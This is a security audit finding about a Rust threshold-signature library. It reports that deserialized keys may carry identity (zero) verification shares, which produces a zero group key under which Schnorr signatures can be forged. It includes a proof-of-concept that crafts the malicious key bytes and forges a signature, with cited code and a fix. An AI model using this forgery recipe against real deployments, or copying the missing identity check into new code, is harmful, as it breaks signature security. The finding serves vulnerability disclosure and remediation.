### Title
Identity/zero verification shares accepted by `ThresholdKeys::read` yield a zero group key under which signatures are forgeable - ([File: crypto/dkg/src/lib.rs])

### Summary
`ThresholdKeys::<C>::read` deserializes verification shares with `Ciphersuite::read_G`, which accepts the identity (zero) point. `ThresholdKeys::new` never checks that verification shares or the resulting `group_key` are non-identity. An attacker who supplies crafted serialized keys can therefore install a key set whose `group_key` is the identity point. Any Schnorr `(R, s)` with `R = s·G` verifies against an identity public key, so signatures over arbitrary messages can be forged, and every `verify_share`/verification-share check degenerates. This is the direct analog of the reported bug: a zero value (there a block hash, here identity group elements / zero scalars) is written into committed state without a non-zero check, invalidating all downstream proofs built on it.

### Finding Description
- `Ciphersuite::read_G` (`crypto/ciphersuite/src/lib.rs:91-101`) only enforces canonical encoding — it does not reject the identity point.
- `Curve::read_G` (`crypto/frost/src/curve/mod.rs:125-131`) exists precisely because identity is dangerous: it wraps `read_G` and rejects identity. FROST uses it for signing material.
- `ThresholdKeys::read` (`crypto/dkg/src/lib.rs:620-622`) reads each verification share with `<C as Ciphersuite>::read_G` — the non-rejecting variant — and reads `secret_share` with `read_F` (`line 618`), which accepts `0`.
- `ThresholdKeys::new` (`crypto/dkg/src/lib.rs:349-391`) checks counts and participant indexes only; it computes `group_key` by summing `verification_shares[i] * interpolation_factor` (`lines 376-378`) and never asserts it is non-identity.
- The deserialized keys are loaded directly for signing in `GeneratedKeysDb::read_keys` (`processor/src/key_gen.rs:57-60`), and `ThresholdView::verification_share` / `sign_share` paths trust them.

With all verification shares set to the identity (and `Interpolation::Lagrange`, e.g. `t=1, n=1`), `group_key = identity`. `SchnorrSignature::verify` (`crypto/schnorr/src/lib.rs:88-110`) checks `R + c·A − s·G = 0`; with `A = identity` this reduces to `R = s·G`, which any attacker satisfies by picking `s` and setting `R = s·G`. Per-signer verification shares are also identity, so `verify_share`-style checks accept arbitrary shares.

### Impact Explanation
A forged Schnorr signature for the threshold group key on any message. For the node software consuming `ThresholdKeys::read` output (e.g., `processor/src/key_gen.rs:57`), corrupted or attacker-influenced stored keys yield a group key of zero under which all signatures verify — analogous to the report's "proofs become invalid/forgeable once the stored value is zeroed". Share verification, blame, and aggregate verification all collapse because every equation containing `c·A` loses its key-binding term.

### Likelihood Explanation
Requires feeding crafted bytes to `ThresholdKeys::read` (listed as an in-scope untrusted read path). It needs no secret knowledge, collusion, or protocol participation — purely malformed input bytes (identity point encodings and a zero scalar) produce the fully-forgeable state. Severity is bounded by how the consumer obtains the serialized blob, but where it is attacker-influenced the impact is total signature forgery for the affected key set.

### Recommendation
In `ThresholdKeys::new` (or `ThresholdKeys::read`), reject identity verification shares — e.g., read shares via a non-identity `read_G` or check `!share.is_identity()` — and additionally reject `group_key.is_identity()` and a zero `secret_share`. Mirror the defense already present in `Curve::read_G` (`crypto/frost/src/curve/mod.rs:125-131`).

### Proof of Concept
```rust
// crypto/dkg, Ristretto
// Craft serialized ThresholdKeys with t=1, n=1, i=1, Lagrange,
// secret_share = 0, verification_shares[1] = identity.
let mut buf = vec![];
buf.extend(u32::try_from(Ristretto::ID.len()).unwrap().to_le_bytes());
buf.extend(Ristretto::ID);
buf.extend(1u16.to_le_bytes()); // t
buf.extend(1u16.to_le_bytes()); // n
buf.extend(1u16.to_le_bytes()); // i
buf.push(1);                    // Lagrange
buf.extend(Scalar::ZERO.to_repr().as_ref()); // secret_share
buf.extend(RistrettoPoint::identity().to_bytes().as_ref()); // verification share

let keys = ThresholdKeys::<Ristretto>::read(&mut buf.as_slice()).unwrap();
assert!(bool::from(keys.group_key().is_identity())); // accepted: group key = 0

// Forge: s arbitrary, R = s*G verifies since A = identity
let s = Scalar::random(&mut OsRng);
let forged = SchnorrSignature::<Ristretto> { R: RistrettoPoint::generator() * s, s };
assert!(forged.verify(keys.group_key(), Scalar::random(&mut OsRng))); // passes for ANY challenge/message
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** crypto/dkg/src/lib.rs (L376-391)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();

    Ok(ThresholdKeys {
      core: Arc::new(Zeroizing::new(ThresholdCore {
        params,
        interpolation,
        secret_share,
        group_key,
        verification_shares,
      })),
      scalar: C::F::ONE,
      offset: C::F::ZERO,
    })
  }
```

**File:** crypto/dkg/src/lib.rs (L618-631)
```rust
    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```

**File:** crypto/ciphersuite/src/lib.rs (L91-101)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
  }
```

**File:** crypto/frost/src/curve/mod.rs (L123-131)
```rust
  /// Read a point from a reader, rejecting identity.
  #[allow(non_snake_case)]
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let res = <Self as Ciphersuite>::read_G(reader)?;
    if res.is_identity().into() {
      Err(io::Error::other("identity point"))?;
    }
    Ok(res)
  }
```

**File:** crypto/schnorr/src/lib.rs (L88-110)
```rust
  pub fn batch_statements(&self, public_key: C::G, challenge: C::F) -> [(C::F, C::G); 3] {
    // s = r + ca
    // sG == R + cA
    // R + cA - sG == 0
    [
      // R
      (C::F::ONE, self.R),
      // cA
      (challenge, public_key),
      // -sG
      (-self.s, C::generator()),
    ]
  }

  /// Verify a Schnorr signature for the given key with the specified challenge.
  ///
  /// This challenge must be properly crafted, which means being binding to the public key, nonce,
  /// and any message. Failure to do so will let a malicious adversary to forge signatures for
  /// different keys/messages.
  #[must_use]
  pub fn verify(&self, public_key: C::G, challenge: C::F) -> bool {
    multiexp_vartime(&self.batch_statements(public_key, challenge)).is_identity().into()
  }
```

**File:** processor/src/key_gen.rs (L56-62)
```rust
    while !keys_ref.is_empty() {
      substrate_keys.push(ThresholdKeys::read(&mut keys_ref).unwrap());
      let mut these_network_keys = ThresholdKeys::read(&mut keys_ref).unwrap();
      N::tweak_keys(&mut these_network_keys);
      network_keys.push(these_network_keys);
    }
    Some((keys_vec, (substrate_keys, network_keys)))
```
